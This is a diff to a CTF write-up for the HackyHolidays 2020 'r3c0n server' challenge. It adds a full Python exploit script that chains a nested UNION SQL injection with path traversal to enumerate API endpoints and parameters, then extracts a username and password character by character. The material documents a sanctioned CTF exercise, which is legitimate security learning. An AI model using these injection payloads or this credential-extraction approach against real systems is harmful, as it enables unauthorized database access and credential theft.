@@ -212,12 +212,12 @@ Request #1 is to generate a valid link to the specified API end-point with a val
   <img src="screenshots/r3c0n-server-9.png" style="width:90%; border:0.5px solid black">
 </p>
 
-Time to whip up a simple fuzzer that will does the fuzzing for us! My fuzzer can be found [here](r3c0n-server-exploit.py) (look at the `fuzz_api()` function). After fuzzing with the `objects.txt` from [seclists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects.txt), the results obtained were:
+Time to whip up a simple fuzzer that will does the fuzzing for us! My fuzzer can be found [here](#enum-script) (look at the `fuzz_api()` function). After fuzzing with the `objects.txt` from [seclists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects.txt), the results obtained were:
 
 > False responses contain: `0`, `400`, `404` status codes
 
 ```bash
-$ python script.py /usr/share/seclists/Discovery/Web-Content/api/objects.txt 
+$ python r3c0n-server-exploit.py /usr/share/seclists/Discovery/Web-Content/api/objects.txt 
 
 What to fuzz?
 Options [1] and [2] require a valid wordlist as an argument!
@@ -245,12 +245,12 @@ Maybe it expects parameters?
 
 ### Fuzzing for API Parameters
 
-I added another fuzzing function to my [fuzzer](r3c0n-server-exploit.py) (look at the `fuzz_param()` function). Using `burp-parameter-names.txt` from [seclists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt), the results  obtained were:
+I added another fuzzing function to my [fuzzer](#enum-script) (look at the `fuzz_param()` function). Using `burp-parameter-names.txt` from [seclists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt), the results  obtained were:
 
 > False responses contain: `0`, `400` and `404` status codes
 
 ```bash
-$ python script.py /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+$ python r3c0n-server-exploit.py /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 
 What to fuzz?
 Options [1] and [2] require a valid wordlist as an argument!
@@ -290,7 +290,7 @@ Trying the input `_%` gives us a `TRUE` result (which made me realize this "erro
   <img src="screenshots/r3c0n-server-12.png" style="width:90%; border:0.5px solid black">
 </p>
 
-Since we have the ability to enumerate the names, it is time to include yet another function to my [fuzzer](r3c0n-server-exploit.py) (look at the `fuzz_user()` function), which will do this enumeration for us:
+Since we have the ability to enumerate the names, it is time to include yet another function to my [fuzzer](#enum-script) (look at the `fuzz_user()` function), which will do this enumeration for us:
 
 ```bash
 $ python r3c0n-server-exploit.py
@@ -325,6 +325,214 @@ Which at long last, gives us the flag! 🎌
 We are also shown the challenge [page](https://hackyholidays.h1ctf.com/attack-box) for the [final challenge](attack-box.md).
 
 **Flag:** `flag{07a03135-9778-4dee-a83c-7ec330728e72}`
+
+#### Enum Script
+
+The following is the enumeration script built for this challenge:
+```py
+#
+# Python 2 API Fuzzer w/ Multiprocessing
+#
+# Author: https://github.com/limerencee
+# Created during: HackerOne HackyHolidays 2020 CTF
+#
+#
+# Usage:
+# Adjust the number of threads under "POOL_WORKERS" global variable (default 12).
+#
+# $ pip install bs4 && python r3c0n-server-exploit.py
+#
+
+import requests
+import sys
+from bs4 import BeautifulSoup
+from multiprocessing import Pool
+
+POOL_WORKERS = 12
+
+pool = None
+retry = []
+username = []
+password = []
+
+def log_result(result):
+    global retry
+
+    if result:
+        if result[1]:
+            print "  [+] {}".format(result[0])
+            print "  [+] Link: {}\n".format(result[1])
+        else:
+            print "  [!] {}".format(result[0])
+            print "  [!] Added to retry list"
+            retry.append(result[0])
+
+def log_user_result(result):
+    global pool, username, password
+
+    if result:
+        pool.terminate()
+        if result[1] == "username":
+            username = result[0].split()
+        elif result[1] == "password":
+            password = result[0].split()
+ 
+def multi_request_api(base, word):
+    s = requests.Session()
+
+    # Fuzz and get the generated link
+    res1 = s.get(base.replace('FUZZ', word))
+    soup = BeautifulSoup(res1.content, features="html.parser")
+    
+    # Check if the end-point exists
+    link = 'https://hackyholidays.h1ctf.com' + soup.find("img", {"class": "img-responsive"})['src']
+    res2 = s.get(link)
+
+    # Server instabilities
+    if 'Received: 500' in res2.text:
+        return [word, None]
+    
+    # Wrong guess
+    if  'Received: 0' in res2.text or \
+        'Received: 400' in res2.text or \
+        'Received: 404' in res2.text:
+        return False
+
+    return [word, link]
+
+def multi_request_user(base, word, param):
+    s = requests.Session()
+
+    # Fuzz and get the generated link
+    res1 = s.get(base.replace('FUZZ', word))
+    soup = BeautifulSoup(res1.content, features="html.parser")
+
+    # Check if the word exists
+    link = 'https://hackyholidays.h1ctf.com' + soup.find("img", {"class": "img-responsive"})['src']
+    res2 = s.get(link)
+
+    # Correct Guess
+    if 'Invalid content type' in res2.text:
+        return [word, param]
+
+    return None
+
+def fuzz_api(wordlist):
+    global pool, retry
+    pool = Pool(POOL_WORKERS)
+
+    base = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/FUZZ%27%20--%20-%22,1,1--%20-'
+
+    print "[+] Discovered end-point(s): "
+    with open(wordlist, 'r') as file:
+        words = file.readlines()
+        words = [word.strip() for word in words]
+        for word in words:
+            pool.apply_async(multi_request_api, [base, word], callback=log_result)
+
+    while len(retry) > 0:
+        print "[+] Retrying failed words..."
+        for word in retry:
+            pool.apply_async(multi_request_api, [base, word], callback=log_result)
+        retry = []
+
+    pool.close()
+    pool.join()
+
+def fuzz_param(wordlist):
+    global pool, retry
+    pool = Pool(POOL_WORKERS)
+
+    base = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/user%3FFUZZ%3Da%27%20--%20-%22,1,1--%20-'
+
+    print "[+] Discovered parameters(s): "
+    with open(wordlist, 'r') as file:
+        words = file.readlines()
+        words = [word.strip() for word in words]
+        for word in words:
+            pool.apply_async(multi_request_api, [base, word], callback=log_result)
+
+    while len(retry) > 0:
+        print "[+] Retrying failed words..."
+        for word in retry:
+            pool.apply_async(multi_request_api, [base, word], callback=log_result)
+        retry = []
+
+    pool.close()
+    pool.join()
+
+def fuzz_creds(param, found_username):
+    global pool, username, password
+    pool = Pool(POOL_WORKERS)
+
+    # Guessing Username
+    base1 = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/user%3Fusername%3DFUZZ%25%27%20--%20-%22,1,1--%20-'
+
+    # Guessing Password given Valid Username
+    base2 = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/user%3Fusername%3D{}%26password%3DFUZZ%25%27%20--%20-%22,1,1--%20-'.format(found_username)
+
+    if param == "username":
+        for c in range(32, 127):
+            if c == 95: continue # ignore _
+            guess = "".join(username) + chr(c)
+            pool.apply_async(multi_request_user, [base1, guess, "username"], callback=log_user_result)
+    elif param == "password":
+        for c in range(32, 127):
+            if c == 95: continue # ignore _
+            guess = "".join(password) + chr(c)
+            pool.apply_async(multi_request_user, [base2, guess, "password"], callback=log_user_result)
+
+    pool.close()
+    pool.join()
+
+def fuzz_user():
+    global username, password
+
+    found_username = ""
+    found_password = ""
+
+    print "[+] Discovered username: "
+    while True:
+        orig_username = "".join(username)
+        fuzz_creds("username", None)
+        updated_username = "".join(username)
+
+        if orig_username == updated_username:
+            found_username = updated_username
+            print found_username
+            break
+
+    print "[+] Discovered password: "
+    while True:
+        orig_password = "".join(password)
+        fuzz_creds("password", found_username)
+        updated_password = "".join(password)
+
+        if orig_password == updated_password:
+            found_password = updated_password
+            print found_password
+            break
+
+def main():
+    choice = input('What to fuzz?\nOptions [1] and [2] require a valid wordlist as an argument!\n\n[1] API\n[2] API Parameters\n[3] Username & Password\n')
+    print ""
+
+    if choice == 1 or choice == 2:
+        if len(sys.argv) != 2:
+            print "[!] API and API parameters require wordlist as argument!"
+            print "Usage: {} /path/to/wordlist".format(sys.argv[0])
+            sys.exit(1)
+
+    if choice == 1:
+        fuzz_api(sys.argv[1])      # https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects.txt
+    elif choice == 2:
+        fuzz_param(sys.argv[1])     # https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
+    elif choice == 3:
+        fuzz_user()
+
+if __name__ == "__main__":
+    main()
+```
 
 ## Thoughts
 This entire challenge took at least one whole day for me, with majority of the time spent trying to gain the initial foothold. Never have I thought I would need to use a 2<sup>nd</sup> order Blind SQL injection using `UNION`. This was certainly an interesting albeit unrealistic scenario! 😅
